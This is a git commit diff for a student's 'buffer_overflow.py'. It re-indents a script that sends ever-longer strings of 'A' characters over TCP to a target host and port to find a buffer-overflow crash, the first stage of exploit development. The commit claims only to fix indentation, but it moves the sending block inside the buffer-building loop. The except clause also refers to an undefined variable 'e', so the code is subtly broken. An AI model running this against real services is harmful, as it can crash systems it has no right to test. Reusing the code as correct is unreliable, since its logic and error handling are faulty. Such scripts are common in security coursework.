09b01783f218b65c25ce7d613b3dcd1da1febc94
Sabrina Lawrence <sklawren@usc.edu>
2023-10-25 23:27:33 -0700

    Update buffer_overflow.py
    fix indentation

--- buffer_overflow.py
+++ buffer_overflow.py
@@ -9,16 +9,16 @@ counter = 100
 while len(buffer) <= 10:
     buffer.append('\x41' * counter)
     counter += 100
-try:
-    for string in buffer:
-        print(f'Sending {len(string)} bytes...')
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip,target_port))
-        s.recv(1024)
-        s.send((string + '\r\n').encode())
-        print ('Bytes sent.')
-except:
-    print(f'Unable to connect to the application. Reason: {e}.')
-    sys.exit(0)
-finally:
-	s.close()
+    try:
+        for string in buffer:
+            print(f'Sending {len(string)} bytes...')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip,target_port))
+            s.recv(1024)
+            s.send((string + '\r\n').encode())
+            print ('Bytes sent.')
+    except:
+        print(f'Unable to connect to the application. Reason: {e}.')
+        sys.exit(0)
+    finally:
+        s.close()
